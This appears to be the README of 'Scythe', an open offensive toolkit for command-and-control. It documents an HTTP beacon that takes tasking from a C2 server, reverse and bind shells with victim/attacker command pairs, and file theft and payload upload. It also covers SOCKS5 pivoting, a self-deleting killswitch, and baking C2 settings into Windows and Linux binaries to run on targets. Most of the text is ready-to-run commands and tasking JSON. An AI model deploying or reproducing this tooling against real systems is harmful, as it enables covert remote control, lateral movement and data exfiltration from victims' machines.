# Scythe

Single-binary tooling for HTTP beacons, TCP pivots, file transfer, and a SOCKS5 listener. **Pure Go** (`CGO_ENABLED=0` builds are static-friendly; no extra runtime beyond the OS).

**Requirements:** Go **1.23+** (see `go.mod`). Builds from `./cmd`.

```bash
cd cmd && CGO_ENABLED=0 go build -o Scythe .
./Scythe Http -h
```

---

## Subcommands

| Subcommand | Role |
|------------|------|
| **Http** | HTTP client: poll a URL on an interval, parse JSON tasking, post results. Optional SOCKS5. |
| **Netcat** | Reverse/bind shells, listener, TLS, optional SOCKS5 pivot. |
| **FileTransfer** | TCP client/server file send/receive (TLS optional). |
| **Proxy** | SOCKS5 proxy server (listen). |
| **Scanner** | Placeholder (not documented here). |

---

## Http

The Http mode drives C2-style check-ins: it issues requests to `-url` (with optional `-directories` path suffixes), reads JSON bodies, runs **built-in** or **shell** commands from a `Commands` array, and POSTs output to `-url/receive` (and `/receive/<uuid>` when a UUID appears in the directory path).

### Flags

| Flag | Meaning |
|------|---------|
| `-url` | Base URL (required). |
| `-method` | HTTP method (default `GET`). |
| `-timeout` | Request timeout and **poll interval** (e.g. `5s`, `30s`). |
| `-headers` | Comma-separated `key:value` pairs (values may need care if they contain commas—use Python JSON for embedded builds). |
| `-body` | JSON or string body for non-GET requests. |
| `-directories` | Comma-separated path fragments appended to `-url` (one chosen at random per request if multiple). |
| `-skip-tls-verify` | Skip TLS certificate verification. |
| `-proxy` | SOCKS5 proxy `host:port`; traffic to `-url` uses this dialer. |

### Examples (Http)

**1. Minimal check-in** (replace host, port, and UUIDs with yours):

```bash
cd cmd && CGO_ENABLED=0 go build -o Scythe .

./Scythe Http \
  -method GET \
  -timeout 5s \
  -url http://10.0.20.243:8080 \
  -headers 'Content-Type:application/json,X-Client-Id:ac0390ba-8edb-4411-85bc-ddec7d9381ba,X-API-Secret:YOUR_SECRET_HERE' \
  -directories '/heartbeat,/heartbeat/ac0390ba-8edb-4411-85bc-ddec7d9381ba'
```

The beacon polls every `-timeout` period. The server should return JSON; when it includes a `Commands` array, each item runs (built-in or `exec`).

**2. Http through a SOCKS5 pivot** (e.g. parent beacon or local Tor):

```bash
./Scythe Http -method GET -timeout 10s -url https://c2.example.com:443 \
  -headers 'Content-Type:application/json,X-Client-Id:YOUR-UUID' \
  -directories '/heartbeat,/heartbeat/YOUR-UUID' \
  -proxy 127.0.0.1:9050 \
  -skip-tls-verify
```

**3. What the C2 might return** (illustrative)—mixed built-ins and a shell command:

```json
{
  "Active": true,
  "ClientId": "ac0390ba-8edb-4411-85bc-ddec7d9381ba",
  "Commands": [
    "whoami",
    "environment",
    "download /etc/hostname",
    "uname -a"
  ]
}
```

The beacon posts stdout/stderr (or built-in output) back to `POST {base}/receive/...` for the operator to read.

**4. Upload to the beacon via JSON** (must be an object in `Commands`, not a plain string):

```json
{
  "Commands": [
    {
      "op": "upload",
      "path": "/tmp/tool.sh",
      "content_base64": "IyEvYmluL3NoCmVjaG8gaGVsbG8="
    }
  ]
}
```

(`content_base64` is standard base64 of the raw file bytes.)

**5. Download using only strings** (no JSON object required):

```json
{
  "Commands": [
    "download /var/log/syslog"
  ]
}
```

Output in the C2 UI will start with `SCYTHE_FILE_DOWNLOAD v1`, then headers, then one line of base64.

### C2 JSON (`Commands`)

Successful JSON responses may include:

```json
{
  "Commands": [ "whoami", "download /etc/hostname" ],
  "ClientId": "...",
  "Active": true
}
```

`Commands` entries may be **strings** (shell line or built-in) or **JSON objects** for structured file ops (see below). Results are posted back with the original command string (objects are serialized to JSON in the `command` field).

### HTTP built-in commands (no external `whoami`/`env` binaries)

Handled inside the process before `exec`. Matching is normalized (trim, quotes, invisible characters where applicable).

| Token / form | Behavior |
|----------------|----------|
| `whoami` | Current username (`os/user`). |
| `groups` | Group names for the current user. |
| `env` / `environment` | Process environment (`os.Environ()`), sorted `KEY=value` lines. |
| `download <path>` | Read **local** file on the beacon; output is text starting with `SCYTHE_FILE_DOWNLOAD v1`, metadata, then **base64** body. Max **64 MiB** (`MaxHTTPBuiltinFileBytes`). Path is everything after the first space. |
| *(object)* | See **File upload/download via JSON** below. |
| *(anything else)* | Passed to `exec` (argv split on whitespace)—normal shell binary name + args. |

**Killswitch:** a command string exactly equal to `sendmetojesusdog` (after trim) stops the beacon and attempts **self-delete** of the binary (OS-specific; see code in `pkg/httpclient/client.go`).

### File upload/download via JSON (C2 → beacon)

Use **JSON objects** in `Commands` when you need to pass structured data (required for **upload**).

**Download (object form):**

```json
{"op": "download", "path": "/etc/hostname"}
```

or shorthand:

```json
{"download": "/etc/hostname"}
```

**Upload:**

```json
{
  "op": "upload",
  "path": "/tmp/payload.sh",
  "content_base64": "IyEvYmluL3No..."
}
```

or, if `path` + `content_base64` are both set:

```json
{"path": "/tmp/x", "content_base64": "..."}
```

`contentBase64` (camelCase) is also accepted. Parent directories are created as needed; files are written with mode `0644`.

### Local testing

Serve a folder and hit random paths:

```bash
cd /tmp && echo ok > index.html
python3 -m http.server 5000 &
./Scythe Http -method GET -timeout 3s -url http://127.0.0.1:5000 \
  -directories /index.html,/index.html,/other
```

Stop the server with `fg` then Ctrl+C, or `kill` the `python3` job.

---

## Netcat

Use `-proxy host:port` when you must pivot through a SOCKS5 hop.

| Mode | Victim / attacker sketch |
|------|---------------------------|
| **Reverse** | Victim: `-reverse -address C2 -port 8000 -tls` · Attacker: `-listen -port 8000 -tls` |
| **Bind** | Victim: `-bind -port 8000 -tls` · Attacker: `-caller -address victim -port 8000 -tls` |

Flags include `-address`, `-port`, `-bind`, `-reverse`, `-caller`, `-listen`, `-tls`, `-proxy`.

### Examples (Netcat)

**Reverse shell — victim** connects out to the attacker listener at `172.17.0.2:8000`:

```bash
./Scythe Netcat -reverse -address 172.17.0.2 -port 8000 -tls
```

**Reverse shell — attacker** listens:

```bash
./Scythe Netcat -listen -port 8000 -tls
```

Then type shell commands; the victim side runs them on its host.

**Bind shell — victim** opens a listener on `:8000`:

```bash
./Scythe Netcat -bind -port 8000 -tls
```

**Bind shell — attacker** dials the victim `172.17.0.2:8000`:

```bash
./Scythe Netcat -caller -address 172.17.0.2 -port 8000 -tls
```

**Reverse through a SOCKS5 proxy** (e.g. `Proxy` on `172.17.0.2:9050`):

```bash
./Scythe Netcat -reverse -address 10.10.10.10 -port 8000 -proxy 172.17.0.2:9050 -tls
```

---

## FileTransfer

Standalone TCP file transfer (not the same as Http `download`/`upload` built-ins). Typical flags: `-listen`, `-send`, `-download`, `-hostname`, `-port`, `-filename`, `-tls`, `-proxy`.

```bash
./Scythe FileTransfer -h
```

### Examples (FileTransfer)

Replace IPs and paths with yours. **TLS** is recommended on real networks (`-tls`).

**Download — victim pulls a file** from the attacker listener:

```bash
# Attacker (listener)
./Scythe FileTransfer -listen -port 8080 -tls

# Victim (client download)
./Scythe FileTransfer -download -filename report.pdf -hostname 10.10.10.10 -port 8080 -tls
```

**Upload — attacker pushes a file** to the victim listener:

```bash
# Victim (listener, writes incoming file)
./Scythe FileTransfer -listen -filename incoming.exe -port 8080 -tls

# Attacker (client send — set hostname to the victim / listener IP)
./Scythe FileTransfer -send -filename payload.exe -hostname 192.168.1.50 -port 8080 -tls
```

Use the same `-port` (and `-tls`) on both sides; the sender must reach the listener’s IP/DNS via `-hostname`.

---

## Proxy

SOCKS5 server (default listen port in code is **8181** unless you pass `-port`):

```bash
./Scythe Proxy -port 9050
```

### Examples (Proxy + Http / Netcat)

**1. Start SOCKS5 on the pivot host** (`9050`):

```bash
./Scythe Proxy -port 9050
```

**2. Http beacon through the pivot** (beacon host reaches C2 via the proxy):

```bash
./Scythe Http -timeout 5s -url http://C2_HOST:8080 \
  -headers 'Content-Type:application/json,X-Client-Id:UUID' \
  -directories '/heartbeat,/heartbeat/UUID' \
  -proxy PIVOT_IP:9050
```

**3. Netcat reverse through the pivot** (same idea as earlier `-proxy` example).

---

## Embedded builds (no CLI at runtime)

You can bake the subcommand and flags into the binary at **link time** so running `./Scythe` with **no arguments** replays a full argv (e.g. Http with URL and headers). The linker sets `pkg/userinput.EmbeddedArgv` to **base64(JSON array of strings)**.

- **Runtime:** if `EmbeddedArgv` is set and you start the process with **only** `argv[0]`, embedded argv is applied. If you pass any CLI arguments, normal parsing wins.
- **Cross-compile:** third argument to the helper script = `linux` | `windows` | `darwin` (`macos` allowed); optional fourth = architecture (`amd64`, `arm64`, `x86_64`, …). `CGO_ENABLED=0` for cross-builds.

### Helper script

From repo root:

```bash
./scripts/build-embedded.sh '["Http","-url","https://example/api","-timeout","30s"]' ./out.bin linux amd64
```

Arguments: `JSON` · `[output path]` · `[OS]` · `[arch]`. Default output is `./Scythe.embedded`. Omit OS/arch for a **native** build.

### Safe JSON for complex flags

Prefer `json.dumps` so commas/quotes in `-headers` do not break:

```bash
JSON=$(python3 -c 'import json; print(json.dumps([
  "Http","-timeout","5s","-url","http://10.0.0.1:8080",
  "-headers","Content-Type:application/json,X-Client-Id:..."
]))'
./scripts/build-embedded.sh "$JSON" ./Scythe.embedded windows amd64
```

### Manual `go build`

```bash
JSON=$(python3 -c 'import json; print(json.dumps(["Http","-url","https://x","-timeout","30s"]))')
B64=$(printf '%s' "$JSON" | base64 | tr -d '\n')
GOOS=linux GOARCH=amd64 CGO_ENABLED=0 go build -trimpath \
  -ldflags "-X github.com/BuildAndDestroy/Scythe/pkg/userinput.EmbeddedArgv=${B64}" \
  -o Scythe.embedded ./cmd
```

Linker variable: `github.com/BuildAndDestroy/Scythe/pkg/userinput.EmbeddedArgv`.

### Examples (embedded)

**1. Build** a Windows amd64 Http beacon with no runtime flags:

```bash
# From repo root
./scripts/build-embedded.sh \
  '["Http","-method","GET","-timeout","5s","-url","http://192.168.1.10:8080","-headers","Content-Type:application/json,X-Client-Id:YOUR-UUID","-directories","/heartbeat,/heartbeat/YOUR-UUID"]' \
  ./Scythe.exe windows amd64
```

**2. Run** on the target (no arguments—the argv is inside the binary):

```cmd
Scythe.exe
```

**3. Override** for debugging (normal CLI wins over embedded):

```bash
./Scythe.embedded Http -url http://127.0.0.1:8080 -timeout 2s
```

**4. Long headers** (use a heredoc so JSON stays valid):

```bash
JSON=$(python3 <<'PY'
import json
print(json.dumps([
    "Http",
    "-timeout", "5s",
    "-url", "http://10.0.0.1:8080",
    "-directories", "/heartbeat,/heartbeat/uuid-here",
    "-headers",
    "Content-Type:application/json,X-Client-Id:uuid,X-API-Secret:secret,User-Agent:CustomAgent/1.0",
]))
PY
)
./scripts/build-embedded.sh "$JSON" ./Scythe.embedded linux amd64
```

**5. Netcat reverse embedded** (example):

```bash
./scripts/build-embedded.sh \
  '["Netcat","-reverse","-address","10.0.0.5","-port","4444","-tls"]' \
  ./nc-embedded linux amd64
```

---

## Docker

`Dockerfile` installs Go and `ca-certificates`, then cross-builds Linux/Windows/Darwin binaries from `./cmd`. Requires network for module download during build.

```bash
docker build -t scythe .
```

---

## CI

GitHub Actions (`.github/workflows/go.yml`) builds the Linux amd64 binary from `cmd/`. Align the workflow Go version with `go.mod` when you bump the toolchain.

---

## ReaperC2

[ReaperC2](https://github.com/BuildAndDestroy/ReaperC2) can drive Scythe over Http. It vendors Scythe under **`third_party/Scythe`** as a **git submodule**.

1. **Initialize the submodule** before building images or using “Download Scythe.embedded”:

   ```bash
   git submodule update --init --recursive
   ```

2. **Keep the submodule on a commit** that includes the Http features you need (built-ins, `download`/`upload`, etc.). If you see errors like `exec: "environment": executable file not found`, the running beacon was almost certainly built from an **old** Scythe submodule—update the submodule, rebuild, redeploy.

3. **String vs JSON `Commands`:** plain strings work for `whoami`, `download /path`, etc. **Upload** and object-style **download** require **`Commands` array elements that are JSON objects**. If the C2 only queues strings, extend it to push structured documents (MongoDB arrays can hold mixed types). Plain `download /path` does not require C2 changes.

---

## License

See `LICENSE` in the repository.
